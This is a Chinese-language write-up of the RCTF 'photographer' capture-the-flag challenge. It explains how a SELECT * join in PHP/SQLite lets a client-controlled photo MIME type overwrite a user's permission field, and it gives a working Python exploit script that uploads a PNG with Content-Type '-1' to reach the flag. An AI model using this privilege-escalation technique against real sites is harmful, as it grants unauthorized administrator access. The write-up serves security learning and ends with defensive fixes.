# photographer

## 题目简述

题目是一套 PHP + SQLite 相册站。`/superadmin.php` 只有在已登录且 `Auth::type() < 0` 时返回 flag；普通用户的 `user.type` 为 2。用户模型为了同时取得背景图信息，对 `user` 和 `photo` 执行 `SELECT *` 风格的 LEFT JOIN，而两张表都存在名为 `type` 的列。SQLite 结果以 `SQLITE3_ASSOC` 返回时，同名的 `photo.type` 覆盖 `user.type`；上传逻辑又直接信任客户端 multipart 中的 MIME type，因此图片元数据可以覆盖权限字段。

## 解题过程

### 从鉴权条件追到同名列

目标页的判断为：

```php
$user_types = config('user_types'); // admin => 0, auditor => 1, user => 2

if (Auth::check() && Auth::type() < $user_types['admin']) {
    echo getenv('FLAG') ?: 'RCTF{test_flag}';
}
```

`Auth::init()` 根据 Session 中的用户 ID 调用 `User::findById()`：

```php
return DB::table('user')
    ->leftJoin('photo', 'user.background_photo_id', '=', 'photo.id')
    ->where('user.id', '=', $userId)
    ->first();
```

查询没有给同名字段起别名。自定义 DB 层用下面的模式取结果：

```php
$row = $result->fetchArray(SQLITE3_ASSOC);
```

关联结果中，后出现的 `photo.type`（图片 MIME）占用了关联数组的 `type` 键，覆盖前面的 `user.type`（权限等级）。PHP 项目已有的 [SQLite3Result JOIN 同名列问题](https://github.com/php/php-src/issues/20300) 记录了同类行为；对本题真正重要的结论已在此写明：`SQLITE3_ASSOC` 只保留列名键，`SELECT *` 连接出的重复列名无法同时表示，后值覆盖前值。

### 让 photo.type 变成负数

图片上传会验证扩展名和图片内容，但写数据库时直接使用 `$_FILES` 提供的 MIME 字段：

```php
$file = [
    'name' => $files['name'][$i],
    'type' => $files['type'][$i],
    'tmp_name' => $files['tmp_name'][$i],
    // ...
];

Photo::create([
    'type' => $file['type'],
    // ...
]);
```

因此文件本体仍提交一张合法 PNG，只把 multipart part 的 `Content-Type` 设置为 `-1`。上传后再把该照片设为当前用户的背景图，后续请求重新加载用户时，`Auth::type()` 取得字符串 `"-1"`。PHP 在数值比较中把它转成 -1，于是 `"-1" < 0` 成立。

核心请求可以缩减为：

```python
import re
import requests

s = requests.Session()
base = "https://challenge.example"

# 先按正常流程注册并保持登录；各表单的 CSRF 从对应页面提取。
png = (
    b"\x89PNG\r\n\x1a\n\x00\x00\x00\rIHDR"
    b"\x00\x00\x00\x01\x00\x00\x00\x01\x08\x06\x00\x00\x00"
    b"\x1f\x15\xc4\x89\x00\x00\x00\nIDATx\x9cc\x00\x01"
    b"\x00\x00\x05\x00\x01\r\n-\xb4\x00\x00\x00\x00IEND\xaeB`\x82"
)

upload = s.post(
    f"{base}/api/photos/upload",
    files={"photos[]": ("background.png", png, "-1")},
).json()
photo_id = upload["photos"][0]["id"]

settings = s.get(f"{base}/settings").text
csrf = re.search(r'name="csrf_token" value="([a-f0-9]+)"', settings).group(1)
s.post(
    f"{base}/api/user/background",
    data={"photo_id": photo_id, "csrf_token": csrf},
)

print(s.get(f"{base}/superadmin.php").text)
```

PDF 第 16 页给出的验证结果为：

```text
RCTF{h4rd_70_54y_wh37h3r_175_4_bu6_0r_4_f347ur3}
```

## 方法总结

- 核心技巧：JOIN 结果中的同名列覆盖，把可控 MIME 字段变成鉴权字段，再利用 PHP 弱类型数值比较。
- 识别信号：`SELECT *` 连接多表、结果按列名组成关联数组、不同语义的表复用了 `type` 等通用列名。
- 复用要点：权限查询应显式选择并别名化字段；上传 MIME 必须由服务端检测，不能把 multipart 声明值持久化后用于任何安全判断。
